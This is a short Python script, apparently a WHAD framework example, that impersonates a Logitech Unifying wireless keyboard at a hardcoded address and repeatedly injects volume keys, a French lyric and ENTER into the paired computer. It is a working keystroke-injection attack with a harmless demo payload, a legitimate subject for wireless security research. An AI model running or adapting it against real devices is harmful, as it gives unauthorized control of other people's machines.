from whad.unifying import Keyboard
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from whad.scapy.layers.esb import *
from whad.scapy.layers.unifying import *
from scapy.compat import raw
import sys,time

def show(pkt):
    print(pkt.metadata, repr(pkt))

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            connector = Keyboard(dev)
            connector.start()
            #connector.attach_callback(show, on_reception=True, on_transmission=False)
            connector.channel = 5
            connector.address = "ca:e9:06:ec:a4"#"9b:0a:90:42:96"

            #connector.key = bytes.fromhex("08f59b42d06fd3bdc588cd4d1c244018")
            #connector.aes_counter = 0

            connector.synchronize()

            while True:
                time.sleep(1)
                connector.volume_up()
                time.sleep(1)
                connector.volume_down()
                time.sleep(1)
                connector.volume_toggle()
                time.sleep(1)
                connector.volume_toggle()
                time.sleep(1)
                connector.send_text("le petit bonhomme en mousse qui s'échappe et puis qui saute le plongeoir")
                time.sleep(1)
                connector.send_key("ENTER")

        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
